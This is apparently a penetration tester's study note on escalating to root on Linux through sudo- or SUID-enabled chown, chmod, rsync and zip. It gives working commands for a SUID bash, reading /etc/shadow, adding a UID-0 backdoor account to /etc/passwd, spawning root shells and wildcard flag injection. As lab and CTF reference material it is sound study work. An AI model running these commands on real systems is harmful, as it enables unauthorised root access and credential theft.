# chown / chmod / rsync / zip — Sudo (or SUID) to Root

**Trigger:** `sudo -l` (or a SUID scan) shows one of these everyday binaries runnable as root. Same family as [[Tar-Wildcard-Sudo-to-Root]] — ordinary admin tools with one abusable feature. Always confirm the exact escape on [GTFOBins](https://gtfobins.github.io).

> **Two flavors — know which you're dealing with:**
> - **Runs a command as root** (real code execution): `rsync`, `zip`. Straight to a shell.
> - **Changes owner/permissions as root** (no code exec by itself): `chown`, `chmod`. You then abuse the file you just took control of — a second step.

---

## chmod — flip the SUID bit on bash (cleanest of all)

`chmod` = **ch**ange **mod**e (permissions). It runs no code, but if you can `chmod` as root you can just **make bash SUID-root**:

```bash
sudo chmod u+s /bin/bash      # set SUID bit on bash
/bin/bash -p                   # -p keeps privileges → euid=0(root)
id
```
→ `u+s` = add the SUID bit for the owner (root). Now anyone running `/bin/bash -p` runs it as root. Same payoff as the tar trick, one command.

**Or open a root-only file for reading:**
```bash
sudo chmod 644 /etc/shadow    # make shadow world-readable
cat /etc/shadow               # grab hashes → crack offline
```

---

## chown — take ownership of a sensitive file

`chown` = **ch**ange **own**er. No code exec; instead you **give yourself ownership** of a file that matters, then edit it.

**Take /etc/passwd, add a root account:**
```bash
sudo chown $(id -un) /etc/passwd                          # now you own it
echo 'hacker:$1$hack$MLgkAESrYp7kzYz0Ex2fV/:0:0::/root:/bin/bash' >> /etc/passwd
su hacker                                                  # password: password123
```
→ UID/GID `0` = root regardless of name. Hash made with `openssl passwd -1 -salt hack password123`. See [[Linux_Priv_Esc]] §5.

**Or take a SUID-capable binary / your own copy of bash and chown it root, then set SUID** (pairs with chmod above).

---

## rsync — spawn a shell via the `-e` option

`rsync` copies/syncs files. Its `-e` option says **which remote shell to use** — point it at a command and rsync runs it:

```bash
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```
→ rsync executes the `-e` value as root → root shell. (GTFOBins → rsync → Sudo.)

---

## zip — run a command via the archive-test hook

`zip` makes `.zip` archives. `-T` tells it to **test** the finished archive, and `-TT` lets you specify the command used to test — so you smuggle a shell in there:

```bash
TF=$(mktemp -u)
sudo zip "$TF" /etc/hosts -T -TT 'sh #'
```
→ zip archives `/etc/hosts`, then "tests" it by running `sh` as root → root shell. (GTFOBins → zip → Sudo.)

---

## Wildcard variant (pinned command + `*`)

If the sudo rule is **pinned** and ends in `*` (like the tar case), you can't type flags — inject them as filenames. For `chown`/`chmod`, the flag to smuggle is `--reference`:

```bash
# sudo rule: chmod -R 777 *   (runs in a dir you can write to)
touch myfile                                  # a file whose perms/owner YOU set
touch ./'--reference=myfile'                  # chmod copies myfile's mode onto every target
sudo chmod -R 777 *
```
→ `--reference=<file>` makes chmod/chown copy that file's mode/owner instead of a literal value — the wildcard-injection delivery from [[Tar-Wildcard-Sudo-to-Root]] applied to a different binary/flag.

---

## The reflex

1. `sudo -l` and `find / -perm -4000 -type f 2>/dev/null` → list what runs as root.
2. Each binary → **GTFOBins** (Sudo / SUID tab).
3. Ask: does it **run a command** (rsync/zip/tar) or **change owner/perms** (chown/chmod)?
4. Pinned command with `*`? → wildcard-inject the flag instead of typing it.

---

## Related Notes

- [[Tar-Wildcard-Sudo-to-Root]] — the wildcard-injection sibling
- [[Linux_Priv_Esc]] — Section 1 (Sudo Abuse) · Section 2 (SUID) · Section 5 (/etc/passwd)
